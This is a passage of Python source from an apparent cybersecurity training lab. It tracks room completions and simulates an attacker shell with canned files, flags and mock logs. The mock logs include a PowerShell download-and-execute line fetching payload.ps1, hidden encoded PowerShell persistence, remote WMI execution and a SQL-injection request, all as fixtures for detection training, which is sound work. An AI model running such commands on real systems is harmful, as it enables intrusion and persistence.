            if get_purple_edr_bypass_state(info.session_id).get("edr_bypass_emulated"):
                info.record_action("edr_bypass_emulated")
        if "EDR_BYPASS_DETECTION_VALIDATED" in output:
            if get_purple_edr_bypass_state(info.session_id).get("edr_bypass_validated"):
                info.record_action("edr_bypass_detection_validated")
        # Purple Team Room 18
        if "HEATMAP_EMULATION_VERIFIED" in output:
            if get_purple_heatmap_state(info.session_id).get("heatmap_emulated"):
                info.record_action("heatmap_emulated")
        if "HEATMAP_COVERAGE_VALIDATED" in output:
            if get_purple_heatmap_state(info.session_id).get("heatmap_validated"):
                info.record_action("heatmap_coverage_validated")
        # Purple Team Room 19
        if "CONTINUOUS_VALIDATION_EMULATION_VERIFIED" in output:
            if get_purple_continuous_validation_state(info.session_id).get("continuous_val_emulated"):
                info.record_action("continuous_validation_emulated")
        if "CONTINUOUS_VALIDATION_DETECTION_VALIDATED" in output:
            if get_purple_continuous_validation_state(info.session_id).get("continuous_val_validated"):
                info.record_action("continuous_validation_detection_validated")
        # Purple Team Room 20
        if "PURPLE_CAPSTONE_EMULATION_VERIFIED" in output:
            if get_purple_capstone_state(info.session_id).get("capstone_emulated"):
                info.record_action("purple_capstone_emulated")
        if "PURPLE_CAPSTONE_DETECTION_VALIDATED" in output:
            if get_purple_capstone_state(info.session_id).get("capstone_validated"):
                info.record_action("purple_capstone_detection_validated")
        # Detection Engineering Room 01
        if "DETECTION_FOUNDATIONS_VERIFIED" in output:
            if get_detection_foundations_state(info.session_id).get("pipeline_emulated"):
                info.record_action("detection_foundations_verified")
        if "DETECTION_FOUNDATIONS_VALIDATED" in output:
            if get_detection_foundations_state(info.session_id).get("pipeline_validated"):
                info.record_action("detection_foundations_validated")
        # Detection Engineering Room 02
        if "LOG_NORMALIZATION_VERIFIED" in output:
            if get_detection_normalization_state(info.session_id).get("normalization_emulated"):
                info.record_action("log_normalization_verified")
        if "LOG_NORMALIZATION_VALIDATED" in output:
            if get_detection_normalization_state(info.session_id).get("normalization_validated"):
                info.record_action("log_normalization_validated")
        # Detection Engineering Room 03
        if "SIGMA_SYNTAX_VERIFIED" in output:
            if get_detection_sigma_syntax_state(info.session_id).get("syntax_emulated"):
                info.record_action("sigma_syntax_verified")
        if "SIGMA_SYNTAX_VALIDATED" in output:
            if get_detection_sigma_syntax_state(info.session_id).get("syntax_validated"):
                info.record_action("sigma_syntax_validated")
        # Detection Engineering Room 04
        if "PROCESS_CREATION_VERIFIED" in output:
            if get_detection_process_creation_state(info.session_id).get("process_creation_emulated"):
                info.record_action("process_creation_verified")
        if "PROCESS_CREATION_VALIDATED" in output:
            if get_detection_process_creation_state(info.session_id).get("process_creation_validated"):
                info.record_action("process_creation_validated")
        # Detection Engineering Room 05
        if "NETWORK_DETECTION_VERIFIED" in output:
            if get_detection_network_rules_state(info.session_id).get("network_connection_emulated"):
                info.record_action("network_connection_verified")
        if "NETWORK_DETECTION_VALIDATED" in output:
            if get_detection_network_rules_state(info.session_id).get("network_connection_validated"):
                info.record_action("network_connection_validated")
        # Detection Engineering Room 06
        if "FILE_REGISTRY_VERIFIED" in output:
            if get_detection_file_registry_state(info.session_id).get("file_registry_emulated"):
                info.record_action("file_registry_verified")
        if "FILE_REGISTRY_VALIDATED" in output:
            if get_detection_file_registry_state(info.session_id).get("file_registry_validated"):
                info.record_action("file_registry_validated")
        # Detection Engineering Room 07
        if "AUTH_ABUSE_VERIFIED" in output:
            if get_detection_auth_abuse_state(info.session_id).get("auth_abuse_emulated"):
                info.record_action("auth_abuse_verified")
        if "AUTH_ABUSE_VALIDATED" in output:
            if get_detection_auth_abuse_state(info.session_id).get("auth_abuse_validated"):
                info.record_action("auth_abuse_validated")
        # Detection Engineering Room 08
        if "POWERSHELL_DETECTION_VERIFIED" in output:
            if get_detection_powershell_state(info.session_id).get("powershell_obfuscation_emulated"):
                info.record_action("powershell_obfuscation_verified")
        if "POWERSHELL_DETECTION_VALIDATED" in output:
            if get_detection_powershell_state(info.session_id).get("powershell_obfuscation_validated"):
                info.record_action("powershell_obfuscation_validated")
        # Detection Engineering Room 09
        if "WEB_DETECTION_VERIFIED" in output:
            if get_detection_web_rules_state(info.session_id).get("web_detection_emulated"):
                info.record_action("web_detection_verified")
        if "WEB_DETECTION_VALIDATED" in output:
            if get_detection_web_rules_state(info.session_id).get("web_detection_validated"):
                info.record_action("web_detection_validated")
        # Detection Engineering Room 10
        if "MODSEC_CRS_VERIFIED" in output:
            if get_detection_modsec_state(info.session_id).get("modsec_crs_emulated"):
                info.record_action("modsec_crs_verified")
        if "MODSEC_CRS_VALIDATED" in output:
            if get_detection_modsec_state(info.session_id).get("modsec_crs_validated"):
                info.record_action("modsec_crs_validated")
        # Detection Engineering Room 11
        if "WAZUH_RULES_VERIFIED" in output:
            if get_detection_wazuh_state(info.session_id).get("wazuh_rules_emulated"):
                info.record_action("wazuh_rules_verified")
        if "WAZUH_RULES_VALIDATED" in output:
            if get_detection_wazuh_state(info.session_id).get("wazuh_rules_validated"):
                info.record_action("wazuh_rules_validated")
        # Detection Engineering Room 12
        if "FALSE_POSITIVE_TUNING_VERIFIED" in output:
            if get_detection_false_positive_state(info.session_id).get("false_positive_emulated"):
                info.record_action("false_positive_tuning_verified")
        if "FALSE_POSITIVE_TUNING_VALIDATED" in output:
            if get_detection_false_positive_state(info.session_id).get("false_positive_validated"):
                info.record_action("false_positive_tuning_validated")
        # Detection Engineering Room 13
        if "THRESHOLD_DETECTION_VERIFIED" in output:
            if get_detection_threshold_state(info.session_id).get("threshold_emulated"):
                info.record_action("threshold_detection_verified")
        if "THRESHOLD_DETECTION_VALIDATED" in output:
            if get_detection_threshold_state(info.session_id).get("threshold_validated"):
                info.record_action("threshold_detection_validated")
        # Detection Engineering Room 14
        if "CORRELATION_RULE_VERIFIED" in output:
            if get_detection_correlation_state(info.session_id).get("correlation_emulated"):
                info.record_action("correlation_rule_verified")
        if "CORRELATION_RULE_VALIDATED" in output:
            if get_detection_correlation_state(info.session_id).get("correlation_validated"):
                info.record_action("correlation_rule_validated")
        # Detection Engineering Room 15
        if "DETECTION_UNIT_TEST_VERIFIED" in output:
            if get_detection_unit_testing_state(info.session_id).get("unit_test_emulated"):
                info.record_action("detection_unit_test_verified")
        if "DETECTION_UNIT_TEST_VALIDATED" in output:
            if get_detection_unit_testing_state(info.session_id).get("unit_test_validated"):
                info.record_action("detection_unit_test_validated")
        # Detection Engineering Room 16
        if "YARA_HUNTING_VERIFIED" in output:
            if get_detection_yara_hunting_state(info.session_id).get("yara_emulated"):
                info.record_action("yara_hunting_verified")
        if "YARA_HUNTING_VALIDATED" in output:
            if get_detection_yara_hunting_state(info.session_id).get("yara_validated"):
                info.record_action("yara_hunting_validated")
        # Detection Engineering Room 17
        if "SURICATA_SIGNATURE_VERIFIED" in output:
            if get_detection_suricata_state(info.session_id).get("suricata_emulated"):
                info.record_action("suricata_signature_verified")
        if "SURICATA_SIGNATURE_VALIDATED" in output:
            if get_detection_suricata_state(info.session_id).get("suricata_validated"):
                info.record_action("suricata_signature_validated")
        # Detection Engineering Room 18
        if "THREAT_HUNT_HYPOTHESIS_VERIFIED" in output:
            if get_detection_hunt_hypothesis_state(info.session_id).get("hunt_emulated"):
                info.record_action("threat_hunt_hypothesis_verified")
        if "THREAT_HUNT_HYPOTHESIS_VALIDATED" in output:
            if get_detection_hunt_hypothesis_state(info.session_id).get("hunt_validated"):
                info.record_action("threat_hunt_hypothesis_validated")
        # Detection Engineering Room 19
        if "DETECTION_PIPELINE_VERIFIED" in output:
            if get_detection_pipeline_state(info.session_id).get("pipeline_emulated"):
                info.record_action("detection_pipeline_verified")
        if "DETECTION_PIPELINE_VALIDATED" in output:
            if get_detection_pipeline_state(info.session_id).get("pipeline_validated"):
                info.record_action("detection_pipeline_validated")
        # Detection Engineering Room 20
        if "CAPSTONE_PIPELINE_VERIFIED" in output:
            if get_detection_capstone_state(info.session_id).get("capstone_emulated"):
                info.record_action("capstone_pipeline_verified")
        if "CAPSTONE_PIPELINE_VALIDATED" in output:
            if get_detection_capstone_state(info.session_id).get("capstone_validated"):
                info.record_action("capstone_pipeline_validated")

    async def _eval_command(self, info: LabSessionInfo, command: str) -> str:
        """
        Interactive shell interpreter for the attacker workstation.
        Translates commands and executes live HTTP requests against the local target services.
        """

        cmd = command.strip()
        if not cmd:
            return ""

        real_target_base = f"http://127.0.0.1:{info.target_port}"

        # 1. System Navigation & Identity
        if cmd.startswith("echo "):
            raw_text = command.strip()[5:].strip()
            if (raw_text.startswith('"') and raw_text.endswith('"')) or (raw_text.startswith("'") and raw_text.endswith("'")):
                raw_text = raw_text[1:-1]
            return raw_text + "\n"
        if cmd.startswith("printf "):
            raw_text = command.strip()[7:].strip().strip('"\'').replace("\\n", "\n")
            return raw_text
        if " || echo " in command:
            parts = command.split(" || echo ", 1)
            raw_text = parts[1].strip().strip('"\'')
            return raw_text + "\n"
        if cmd == "whoami":
            return "operator\n"
        if cmd in ("id", "id -a"):
            return "uid=1000(operator) gid=1000(operator) groups=1000(operator)\n"
        if cmd == "pwd":
            return "/home/operator\n"

        # 2. Directory Listings
        if cmd in ("ls", "ls -l", "ls -la"):
            return (
                "total 24\n"
                "drwxr-xr-x 4 operator operator 4096 Nov 14 12:00 .\n"
                "drwxr-xr-x 3 root     root     4096 Nov 14 12:00 ..\n"
                "drwxr-xr-x 2 operator operator 4096 Nov 14 12:00 assets\n"
                "drwxr-xr-x 3 operator operator 4096 Nov 14 12:00 challenges\n"
                "-rwxr-xr-x 1 operator operator  384 Nov 14 12:00 notes.txt\n"
            )
        if "ls " in cmd:
            if "assets" in cmd:
                return (
                    "total 16\n"
                    "-rw-rw-rw- 1 operator operator 1024 Nov 14 12:00 customer_records.db\n"
                    "-rw-r--r-- 1 operator operator  142 Nov 14 12:00 backup_codes.txt\n"
                    "-rw-r--r-- 1 operator operator  110 Nov 14 12:00 cia_scenario.txt\n"
                )
            if "challenges" in cmd:
                return (
                    "total 20\n"
                    "drwxr-xr-x 2 operator operator 4096 Nov 14 12:00 .secret_vault\n"
                    "-rwx------ 1 operator operator  120 Nov 14 12:00 restricted_script.sh\n"
                    "-rw-r--r-- 1 operator operator 4096 Nov 14 12:00 system_telemetry.log\n"
                )
            if ".secret_vault" in cmd:
                return "-rw-r--r-- 1 operator operator 48 Nov 14 12:00 flag_hidden.txt\n"
            if "uploads" in cmd:
                return "total 16\n-rw-r--r-- 1 operator operator 120 Nov 14 12:00 avatar.png\n-rw-r--r-- 1 operator operator 85 Nov 14 12:00 document.txt\n-rw-r--r-- 1 operator operator 95 Nov 14 12:00 poc.php.png\n-rw-r--r-- 1 operator operator 110 Nov 14 12:00 test_script.php\n"
            if "wordlists" in cmd:
                return "total 8\n-rw-r--r-- 1 operator operator 120 Nov 14 12:00 passwords.txt\n-rw-r--r-- 1 operator operator 80 Nov 14 12:00 users.txt\n"
            if "hashes" in cmd:
                return "total 8\n-rw-r--r-- 1 operator operator 180 Nov 14 12:00 hashes.txt\n"
            if "tools" in cmd:
                return "total 12\n-rwxr-xr-x 1 operator operator 520 Nov 14 12:00 privesc_audit.sh\n-rwxr-xr-x 1 operator operator 1420 Nov 14 12:00 vuln_audit.py\n"
            if "soc" in cmd:
                return "total 12\n-rw-r--r-- 1 operator operator 3200 Nov 14 12:00 raw_events.json\n-rw-r--r-- 1 operator operator 1400 Nov 14 12:00 triage_guide.md\n"
            if "windows_events" in cmd:
                return "total 8\n-rw-r--r-- 1 operator operator 4800 Nov 14 12:00 Security_logon_events.json\n"
            if "pcaps" in cmd:
                return "total 16\n-rw-r--r-- 1 operator operator 8192 Nov 14 12:00 incident_capture.pcap\n"

        # 3. File Viewing (cat)
        if cmd.startswith("cat "):
            target_file = cmd[4:].strip()
            if "backup_codes" in target_file:
                return (
                    "# VOLTCORP EMERGENCY RECOVERY KEYS\n"
                    "RECOVERY_KEY_PRIMARY=VOLT-9921-XCA\n"
                    "RECOVERY_TOKEN=NOENTRY{foundations_confidentiality_leak_8821}\n"
                    "STATUS=CONFIDENTIAL\n"
                )
            if "flag_hidden" in target_file:
                return "NOENTRY{linux_hidden_dotfiles_revealed_3182}\n"
            if "restricted_script" in target_file:
                return '#!/bin/sh\necho "[+] Execution verified! Security token: NOENTRY{linux_chmod_execution_unlocked_9104}"\n'
            if "system_telemetry" in target_file:
                return (
                    "[2026-11-14T10:00:01.102Z] [KERNEL] [INFO] CPU0 microcode revision updated\n"
                    "[2026-11-14T10:02:14.412Z] [AUTH] [INFO] Session initialized for operator (uid=1000)\n"
                    "[2026-11-14T10:14:22.091Z] [AUDIT_SYSTEM] [INFO] SECURITY_FLAG: NOENTRY{linux_grep_stream_mastery_5239} | Host: op-station-01\n"
                )
            if "cia_scenario" in target_file:
                return "SCENARIO EVALUATION:\nAsset: Core Ledger Database\nIncident: Unauthorized adversary altered transaction figures.\nClassification: INTEGRITY VIOLATION\n"
            if "cve_catalog" in target_file:
                return (
                    '{\n  "catalog_version": "2026.11",\n  "vulnerabilities": [\n    {\n      "cve": "CVE-2023-9182",\n      "component": "VoltCore HTTP Engine",\n      "affected_versions": ["<2.15.0"],\n      "cvss": 8.6,\n      "severity": "HIGH",\n      "description": "Path traversal flaw in VoltCore HTTP Engine allows unauthenticated file disclosure.",\n      "remediation": "Upgrade VoltCore HTTP Engine to version 2.15.0 or later."\n    },\n    {\n      "cve": "CVE-2024-2104",\n      "component": "VoltAuth Module",\n      "affected_versions": ["1.0.0", "1.0.1", "1.0.2"],\n      "cvss": 9.8,\n      "severity": "CRITICAL",\n      "description": "Default administrative authentication bypass in VoltAuth Module allows arbitrary account compromise.",\n      "remediation": "Apply security patch volt-auth-patch-2104 or upgrade to 1.1.0."\n    }\n  ]\n}\n'
                )
            if "notes" in target_file:
                return (
                    "=== ENGAGEMENT NOTES ===\n"
                    f"Target Host: 10.10.14.90:{info.target_port}\n"
                    "Objective: Hands-on cybersecurity room exercises.\n"
                )
            if "passwords" in target_file:
                return "admin\npassword\n123456\nwelcome\nvoltcorp2024\nsecret\nhunter2\noperator123\n"
            if "users" in target_file:
                return "admin\noperator\nsupport\nguest\nalice\nbob\n"
            if "hashes" in target_file:
                return "alice:5f4dcc3b5aa765d61d8327deb882cf99\nbob:098f6bcd4621d373cade4e832627b4f6\noperator:a4b0810db6ee6073ea415b3a1a9e9e14\nsecadmin:8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\n"
            if "privesc_audit" in target_file:
                return "#!/bin/sh\necho '=== NO ENTRY PRIVILEGE ESCALATION AUDIT ==='\nid\nsudo -l 2>/dev/null || echo 'User operator may run: (root) NOPASSWD: /usr/bin/find'\nfind / -perm -4000 -type f 2>/dev/null || echo '/usr/bin/passwd\\n/usr/local/bin/backup_helper'\n"
            if "avatar" in target_file:
                return "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82\n"
            if "domain_users" in target_file:
                return "Administrator\nkrbtgt\nsvc_sql\nsvc_backup\njdoe\nalovelace\n"
            if "scope_manifesto" in target_file:
                return (
                    "=== VOLTDEFENSE SYSTEMS RED TEAM ENGAGEMENT SCOPE ===\n"
                    "Target Subnet: 10.10.14.0/24\n"
                    "Permitted Ports: 8080, 8085, 8089, 8095-8101\n"
                    "Target Systems: core-target.corp.noentry.local\n"
                    "Excluded: 10.10.14.1 (Gateway), production-payroll.voltcorp.internal\n"
                    "Emergency Contact: soc-lead@voltcorp.noentry.internal\n"
                )
            if "report_template" in target_file:
                return (
                    '{\n'
                    '  "assessment": "VoltDefense Systems Penetration Test",\n'
                    '  "assessor": "NO ENTRY Red Team Operator",\n'
                    '  "scope_verified": true,\n'
                    '  "critical_findings": [\n'
                    '    "Unauthenticated Remote Foothold Acquisition (CVSS 9.8)",\n'
                    '    "Local Privilege Boundary Breach to Root via SUID/Sudo Misconfiguration (CVSS 8.8)",\n'
                    '    "Active Directory Kerberos Insecure Delegation and RC4 Cipher Use (CVSS 7.5)"\n'
                    '  ],\n'
                    '  "remediation_roadmap": "Enforce strict least privilege, patch perimeter dispatchers, and deploy Group Managed Service Accounts."\n'
                    '}\n'
                )
            if "raw_events" in target_file:
                return (
                    '[\n'
                    '  {"event_id": "EVT-1001", "event_type": "USER_AUTH_SUCCESS", "source_ip": "10.10.14.22", "user": "mchen", "timestamp": "2026-11-14T08:12:01Z"},\n'
                    '  {"event_id": "EVT-1003", "event_type": "AUTH_BURST_FAILURE", "source_ip": "198.51.100.42", "user": "root", "timestamp": "2026-11-14T08:15:33Z"}\n'
                    ']\n'
                )
            if "triage_guide" in target_file:
                return (
                    "# VOLTDEFENSE SOC INCIDENT RESPONSE TRIAGE GUIDE\n"
                    "1. Event Ingestion: Filter by frequency and unknown external sources.\n"
                    "2. Correlation: Correlate alerts against MITRE ATT&CK techniques.\n"
                    "3. Escalation: Submit classification to POST /api/soc/triage.\n"
                )
            if "Security_logon" in target_file:
                return (
                    '[\n'
                    '  {"EventID": 4624, "LogonType": 10, "TargetUserName": "operator", "IpAddress": "10.10.14.2"},\n'
                    '  {"EventID": 4720, "TargetUserName": "backdoor_admin", "SamAccountName": "backdoor_admin"}\n'
                    ']\n'
                )
            if "Security_investigation" in target_file:
                return (
                    '[\n'
                    '  {"EventID": 4688, "TimeCreated": "2026-11-14T11:15:30Z", "SubjectUserName": "svc_admin", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -enc SQBFAFgA..."},\n'
                    '  {"EventID": 4732, "TimeCreated": "2026-11-14T11:20:00Z", "TargetUserName": "Administrators", "MemberName": "backdoor_admin"},\n'
                    '  {"EventID": 4104, "TimeCreated": "2026-11-14T11:15:32Z", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.77/payload.ps1\')"},\n'
                    '  {"EventID": 1102, "TimeCreated": "2026-11-14T11:42:01Z", "SubjectUserName": "Administrator", "Description": "The audit log was cleared"}\n'
                    ']\n'
                )
            if "access.log" in target_file or "nginx" in target_file:
                return (
                    '10.10.14.50 - - [14/Nov/2026:09:00:15 +0000] "GET / HTTP/1.1" 200 4120 "-" "Mozilla/5.0"\n'
                    '203.0.113.88 - - [14/Nov/2026:10:11:02 +0000] "GET /.env HTTP/1.1" 404 162 "-" "curl/7.88.1"\n'
                    '203.0.113.88 - - [14/Nov/2026:10:12:30 +0000] "POST /api/login HTTP/1.1" 200 240 "-" "python-requests/2.31.0"\n'
                    '203.0.113.88 - - [14/Nov/2026:10:14:22 +0000] "GET /api/users?id=1%27%20OR%201=1 HTTP/1.1" 500 512 "-" "sqlmap/1.7"\n'
                )
            if "app.log" in target_file:
                return (
                    '{"timestamp": "2026-11-14T09:00:00Z", "level": "INFO", "service": "main", "message": "Service initialized"}\n'
                    '{"timestamp": "2026-11-14T10:14:22Z", "level": "CRITICAL", "service": "db_auth_pool", "caller_ip": "203.0.113.88", "message": "Unhandled SQL syntax error"}\n'
                )
            if "auth_bruteforce" in target_file:
                return (
                    "Nov 14 08:10:02 target sshd[1041]: Failed password for invalid user admin from 198.51.100.55 port 41202 ssh2\n"
                    "Nov 14 08:10:14 target sshd[1042]: Failed password for invalid user operator from 198.51.100.55 port 41204 ssh2\n"
                    "Nov 14 08:10:28 target sshd[1043]: Failed password for invalid user root from 198.51.100.55 port 41206 ssh2\n"
                    "Nov 14 08:10:45 target sshd[1044]: Failed password for invalid user svc_backup from 198.51.100.55 port 41208 ssh2\n"
                    "Nov 14 08:11:02 target sshd[1045]: Failed password for invalid user finance from 198.51.100.55 port 41210 ssh2\n"
                    "Nov 14 08:11:19 target sshd[1046]: Failed password for invalid user devops from 198.51.100.55 port 41212 ssh2\n"
                    "Nov 14 08:11:35 target sshd[1047]: Failed password for invalid user jdoe from 198.51.100.55 port 41214 ssh2\n"
                    "Nov 14 08:11:51 target sshd[1048]: Failed password for invalid user alovelace from 198.51.100.55 port 41216 ssh2\n"
                    "Nov 14 08:12:08 target sshd[1049]: Failed password for invalid user mchen from 198.51.100.55 port 41218 ssh2\n"
                    "Nov 14 08:12:24 target sshd[1050]: Failed password for invalid user secadmin from 198.51.100.55 port 41220 ssh2\n"
                    "Nov 14 08:12:40 target sshd[1051]: Failed password for invalid user hr_lead from 198.51.100.55 port 41222 ssh2\n"
                    "Nov 14 08:12:58 target sshd[1052]: Failed password for invalid user payroll from 198.51.100.55 port 41224 ssh2\n"
                    "Nov 14 08:14:01 target web_auth[2001]: Authentication failure for user support from 203.0.113.19 (attempt 1/8)\n"
                    "Nov 14 08:15:00 target sshd[1060]: Accepted password for operator from 10.10.14.22 port 48102 ssh2\n"
                )
            if "dropper_sample" in target_file or "beacon_stage" in target_file:
                return "MZ\x90\x00 VoltDefense Mock Inert PE32 Sample: VoltStage2_Payload http://c2-stage.voltcorp.internal/gate.php SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
            if "password_reset.eml" in target_file or "urgent_invoice.eml" in target_file:
                return (
                    "Received: from mail.v0ltcorp.internal (198.51.100.99) by mx01.voltcorp.internal with ESMTP; 14 Nov 2026 08:05:22 +0000\n"
                    "Return-Path: <attacker-spoof@v0ltcorp.internal>\n"
                    "From: Chief Information Security Officer <ciso@voltcorp.internal>\n"
                    "Subject: URGENT: Executive Security Certificate & SSO Re-authentication Required\n"
                    "Authentication-Results: mx01.voltcorp.internal; spf=fail; dkim=none; dmarc=fail\n"
                )
            if "endpoint_events" in target_file:
                return (
                    '[\n'
                    '  {"pid": 1204, "ppid": 1120, "name": "winword.exe", "user": "CORP\\\\jdoe"},\n'
                    '  {"pid": 4812, "ppid": 1204, "name": "powershell.exe", "user": "CORP\\\\jdoe", "command_line": "powershell.exe -w hidden -enc ...", "connection": "10.10.14.50:49210 -> 198.51.100.88:443"}\n'
                    ']\n'
                )
            if "nids_traffic" in target_file:
                return (
                    "09:00:15.101 IP 198.51.100.99.41201 > 10.10.14.90.21: Flags [S], seq 100, length 60 (SYN probe)\n"
                    "09:00:15.105 IP 198.51.100.99.41202 > 10.10.14.90.22: Flags [S], seq 101, length 60 (SYN probe)\n"
                    "09:00:16.110 IP 198.51.100.99.41203 > 10.10.14.90.80: Flags [S], seq 102, length 60 (SYN probe)\n"
                    "09:00:16.115 IP 198.51.100.99.41204 > 10.10.14.90.443: Flags [S], seq 103, length 60 (SYN probe)\n"
                    "09:00:17.120 IP 198.51.100.99.41205 > 10.10.14.90.8080: Flags [S], seq 104, length 60 (SYN probe)\n"
                    "09:00:17.125 IP 198.51.100.99.41206 > 10.10.14.90.8443: Flags [S], seq 105, length 60 (SYN probe)\n"
                    "09:01:00.200 IP 10.10.20.15.50112 > 203.0.113.88.8443: Flags [P.], length 128 (HEARTBEAT_V2 interval=15s)\n"
                )
            if "threat_hunting_corpus" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "timestamp": "2026-11-15T14:00:10Z",\n'
                    '    "process": "wmic.exe",\n'
                    '    "command_line": "wmic.exe /node:10.0.1.50 process call create \'powershell.exe -enc JABj...\'",\n'
                    '    "parent_process": "cmd.exe",\n'
                    '    "user": "CORP\\\\compromised_admin",\n'
                    '    "host_count": 1,\n'
                    '    "mitre_technique": "T1047",\n'
                    '    "label": "ATTACK_REMOTE_WMI_EXECUTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "timestamp": "2026-11-15T14:00:20Z",\n'
                    '    "process": "wmic.exe",\n'
                    '    "command_line": "wmic.exe OS get Caption,OSArchitecture",\n'
                    '    "parent_process": "SCCM_Client.exe",\n'
                    '    "user": "NT AUTHORITY\\\\SYSTEM",\n'
                    '    "host_count": 850,\n'
                    '    "label": "BENIGN_SCCM_INVENTORY_QUERY"\n'
                    '  }\n'
                    ']\n'
                )
            if "threat_hunt" in target_file and "threat_hunting_corpus" not in target_file:
                return (
                    '[\n'
                    '  {"event_id": "SYS-8101", "host": "WS-FINANCE-04", "parent_image": "services.exe", "image": "svchost.exe", "pid": 1044, "ppid": 612},\n'
                    '  {"event_id": "SYS-8102", "host": "WS-FINANCE-04", "parent_image": "explorer.exe", "image": "winword.exe", "pid": 2110, "ppid": 1840},\n'
                    '  {"event_id": "SYS-8103", "host": "WS-FINANCE-04", "parent_image": "winword.exe", "image": "powershell.exe", "pid": 4820, "ppid": 2110, "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9..."},\n'
                    '  {"event_id": "SYS-8104", "host": "WS-FINANCE-04", "parent_image": "explorer.exe", "image": "chrome.exe", "pid": 3100, "ppid": 1840}\n'
                    ']\n'
                )
            if "soc_triage" in target_file:
                return (
                    '[\n'
                    '  {"alert_id": "ALT-8819", "severity": "LOW", "status": "FALSE_POSITIVE_AUTHORIZED_SCAN", "details": "Scheduled Qualys vulnerability scanner audit."},\n'
                    '  {"alert_id": "ALT-8820", "severity": "CRITICAL", "status": "UNVERIFIED_PENDING_TRIAGE", "target_asset": "DB-PROD-01", "account": "svc_db_sync", "egress_ip": "198.51.100.77", "exfil_mb": 2400},\n'
                    '  {"alert_id": "ALT-8821", "severity": "INFORMATIONAL", "status": "BENIGN_OPERATIONAL", "details": "Nightly backup verification."}\n'
                    ']\n'
                )
            if "scope_manifest" in target_file:
                return (
                    '{\n'
                    '  "exercise_id": "PT-2026-001",\n'
                    '  "exercise_name": "Collaborative Detection Verification Exercise",\n'
                    '  "mission": "Validate and improve defensive detection capabilities through structured Red/Blue collaboration",\n'
                    '  "collaboration_model": "COLLABORATIVE_PAIRING",\n'
                    '  "coordination_lead": "secops-lead@voltcorp.internal",\n'
                    '  "red_team_lead": "red-lead@voltcorp.internal",\n'
                    '  "blue_team_lead": "blue-lead@voltcorp.internal",\n'
                    '  "focus_tactics": ["Execution", "Persistence", "Credential Access"],\n'
                    '  "focus_technique": "T1059.001",\n'
                    '  "target_asset": "10.10.14.90",\n'
                    '  "target_port": 8301,\n'
                    '  "roes_acknowledged": true,\n'
                    '  "rules_of_engagement": [\n'
                    '    "Collaborative pairing throughout execution",\n'
                    '    "Targeted execution without business disruption",\n'
                    '    "Immediate verification of detection telemetry",\n'
                    '    "Continuous feedback and detection tuning"\n'
                    '  ]\n'
                    '}\n'
                )
            if "auth_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T09:22:15Z",\n'
                    '    "event_id": 4769,\n'
                    '    "event_name": "A Kerberos service ticket was requested",\n'
                    '    "service_name": "MSSQLSvc/db01.corp",\n'
                    '    "ticket_options": "0x40810000",\n'
                    '    "ticket_encryption_type": "0x17",\n'
                    '    "client_address": "10.10.14.10",\n'
                    '    "technique_id": "T1558.003",\n'
                    '    "tactic": "Credential Access",\n'
                    '    "notes": "RC4 Kerberos service ticket requested for SPN - indicative of Kerberoasting attack"\n'
                    '  }\n'
                    ']\n'
                )
            if "persistence_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T09:35:40Z",\n'
                    '    "event_id": 4657,\n'
                    '    "event_name": "A registry value was modified",\n'
                    '    "registry_path": "\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",\n'
                    '    "value_name": "SecurityHealthUpdate",\n'
                    '    "value_data": "powershell.exe -WindowStyle Hidden -Enc SABFAFgA...",\n'
                    '    "technique_id": "T1547.001",\n'
                    '    "tactic": "Persistence",\n'
                    '    "notes": "Adversary established persistence via Windows Registry Run key"\n'
                    '  }\n'
                    ']\n'
                )
            if "exercise_spec" in target_file:
                return (
                    '{\n'
                    '  "simulation_id": "SIM-2026-ALPHA",\n'
                    '  "target_ip": "10.10.14.90",\n'
                    '  "target_port": 8303,\n'
                    '  "governance": {\n'
                    '    "framework": "Rules of Engagement",\n'
                    '    "authorized_window": "09:00-17:00 UTC",\n'
                    '    "production_impact": "ZERO_TOLERANCE",\n'
                    '    "rollback_mandatory": true,\n'
                    '    "rollback_objective": "To prevent leaving systems in an insecure state"\n'
                    '  },\n'
                    '  "planned_steps": [\n'
                    '    {\n'
                    '      "step_id": 1,\n'
                    '      "technique": "T1059.001",\n'
                    '      "name": "PowerShell Script Execution Simulation",\n'
                    '      "command": "powershell.exe -ExecutionPolicy Bypass -File audit_check.ps1",\n'
                    '      "expected_telemetry": "Sysmon EventID 1 (Process Create)",\n'
                    '      "rollback": "Remove audit_check.ps1 and revert execution policy"\n'
                    '    }\n'
                    '  ]\n'
                    '}\n'
                )
            if "scan_results" in target_file:
                return (
                    "# Nmap 7.94 scan report for 10.10.14.90\n"
                    "Host is up (0.00042s latency).\n"
                    "Not shown: 996 closed tcp ports (reset)\n"
                    "PORT     STATE SERVICE\n"
                    "8080/tcp open  http-proxy\n"
                    "8081/tcp open  blackice-icecap\n"
                    "8090/tcp open  opsmessaging\n"
                    "8094/tcp open  unknown-recon-target\n"
                    "MAC Address: 02:42:0A:0A:0E:5A (Docker Virtual)\n"
                    "Scan Type: TCP SYN Stealth Scan (-sS)\n"
                )
            if "sensor_alerts" in target_file:
                return (
                    "[**] [1:200142:1] ET SCAN Potential Aggressive Port Scan Detected [**]\n"
                    "[Classification: Attempted Information Leak] [Priority: 2]\n"
                    "11/15-10:14:02.108239 10.10.14.10:48212 -> 10.10.14.90:8094\n"
                    "TCP TTL:64 TOS:0x0 ID:39102 IpLen:20 DgmLen:40 DF\n"
                    "******S* Seq: 0x39102001 Ack: 0x0 Win: 1024 TcpLen: 20\n"
